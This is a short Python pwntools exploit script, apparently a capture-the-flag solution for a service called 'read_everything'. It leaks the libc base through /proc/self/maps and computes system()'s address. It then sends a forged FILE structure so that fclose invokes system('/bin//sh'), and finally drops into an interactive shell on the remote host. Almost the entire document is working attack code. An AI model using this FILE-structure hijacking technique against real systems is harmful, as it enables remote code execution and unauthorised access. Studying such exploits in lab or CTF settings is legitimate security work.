#!/usr/bin/env python 

from pwn import *
import time

'''
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
'''

"""
0xf7e6e506 <_IO_new_fclose+22>:	cmp    BYTE PTR [esi+0x46],0x0   // esi = stream  , cmp _IO_vtable_offset, 0x0
"""

# We can check memory table from /proc/self/maps
# and get the offset from the dll download by other challenges
# the fd used in fclose will put into a system function

r = remote('172.16.101.57',12021)
#r = process('./read_everything')
#print r.proc.pid

sys_offset = 0x3fcd0

#a = raw_input()
#a = int(a)


r.sendlineafter(':','1')
r.sendlineafter(':','/proc/self/maps')
r.sendlineafter(':','2')
r.sendlineafter(':','2')
r.sendlineafter(':','3')
data = r.readuntil('choice :')
#print data
data = data.split('\n')[2].split('-')[0]
print "libc_base :".ljust(15,' '),data
data = int(data,16)
a = data + sys_offset
print "sys_add :".ljust(15,' '),hex(a)
r.sendline('2')
r.sendlineafter(':','2')
r.sendlineafter(':','5')
time.sleep(1)
r.sendlineafter(':','/bin//sh'+p32(0xffffa000)+p32(a)*5+p32(0x0804b260)+p32(0)*9+p32(0x0804b288)*1+'A'*72+p32(0x804b228)) # many condition in the fclose
r.recvline()
r.interactive()
